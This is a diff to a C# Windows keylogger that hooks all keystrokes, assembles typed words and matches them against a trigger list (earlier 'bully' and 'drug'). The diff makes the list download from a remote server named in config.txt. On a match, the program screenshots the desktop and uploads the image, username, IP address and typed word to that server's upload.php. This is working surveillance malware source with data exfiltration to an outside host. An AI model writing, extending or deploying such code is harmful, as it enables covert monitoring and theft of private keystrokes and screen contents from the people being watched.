@@ -10,6 +10,9 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.Net;
 using System.Net.Sockets;
+using System.Collections.Specialized;
+using System.IO;
+using WebUtils;
 
 namespace keystroke
 {
@@ -23,14 +26,17 @@ namespace keystroke
         private static string word = "";
         private static List<string> spy_list = new List<string>();
 
+        private static string SERVER_ADDRESS = "";
+
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
         [STAThread]
         static void Main()
         {
-            spy_list.Add("bully");
-            spy_list.Add("drug");
+            readConfigFile();
+            getWordList();
+            
             _hookID = SetHook(_proc);
 
             //Application.EnableVisualStyles();
@@ -52,6 +58,33 @@ namespace keystroke
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+        private static void readConfigFile()
+        {
+            StreamReader fs = new StreamReader("config.txt");
+
+            string config = fs.ReadLine();
+            SERVER_ADDRESS = config.Replace("Server_Address=", "").Trim();
+
+            Console.WriteLine(SERVER_ADDRESS);
+
+            fs.Close();
+        }
+
+        private static void getWordList()
+        {
+            string result = WebHttpUtils.getResponse("http://" + SERVER_ADDRESS + "/restapi.php?action=wordlist", "", "");
+            if (string.IsNullOrEmpty(result))
+            {
+                return;
+            }
+
+            string []list = result.Split(',');
+            for (int i = 0; i < list.Count(); i++)
+            {
+                spy_list.Add(list[i]);
+            }
+        }
+
         private static string GetLocalIPAddress()
         {
             var host = Dns.GetHostEntry(Dns.GetHostName());
@@ -65,7 +98,7 @@ namespace keystroke
             throw new Exception("No network adapters with an IPv4 address in the system!");
         }
 
-        private static void takeScreenshot()
+        private static string takeScreenshot()
         {
             Bitmap memoryImage;
 
@@ -84,13 +117,37 @@ namespace keystroke
             //That's it! Save the image in the directory and this will work like charm.  
             string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                       @"\Screenshot" + "_" + urName + "_" + ipAddr + "_" +
-                      DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");
+                      DateTime.Now.ToString("(dd_MMM_yyyy_hh_mm_ss_tt)") + ".png");
 
 
             // save it  
             memoryImage.Save(fileName);
+
+            return fileName;
         }
 
+        private static void uploadImage(string path, string username, string ipaddr, string word)
+        {
+            try
+            {
+                WebClient client = new WebClient();
+                string myFile = path;
+                client.Credentials = CredentialCache.DefaultCredentials;
+
+                NameValueCollection parameters = new NameValueCollection();
+                parameters.Add("username", username);
+                parameters.Add("ipaddr", ipaddr);
+                parameters.Add("word", word);
+                client.QueryString = parameters;
+
+                client.UploadFile(@"http://" + SERVER_ADDRESS + "/upload.php", "POST", myFile);
+                client.Dispose();
+            }
+            catch (Exception err)
+            {
+                MessageBox.Show(err.Message);
+            }
+        }
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
@@ -100,8 +157,7 @@ namespace keystroke
                 Console.WriteLine((Keys)vkCode);
 
                 if (vkCode == 13 || vkCode == 9 || vkCode == 32)
-                {
-                    
+                {                    
                     bool exist = false;
 
                     for (int i = 0; i < spy_list.Count; i++)
@@ -114,14 +170,31 @@ namespace keystroke
                     }
 
                     if (exist == true)
-                        takeScreenshot();
+                    {
+                        string path = takeScreenshot();
+                        string urName = System.Environment.UserName;
+                        string ipAddr = GetLocalIPAddress();
+                        uploadImage(path, urName, ipAddr, word);
+                    }
                         
                     word = "";
                 }
                 else
                 {
-                    char character = (char)vkCode;
-                    word += character.ToString();
+                    if (vkCode == 46)
+                    {
+                    }
+                    else if (vkCode == 8)
+                    {
+                        if (word.Length > 0)
+                            word = word.Substring(0, word.Length - 1);
+                    }
+                    else
+                    {
+                        char character = (char)vkCode;
+                        word += character.ToString();
+                    }
+                        
                     Console.WriteLine(word);
                 }
 
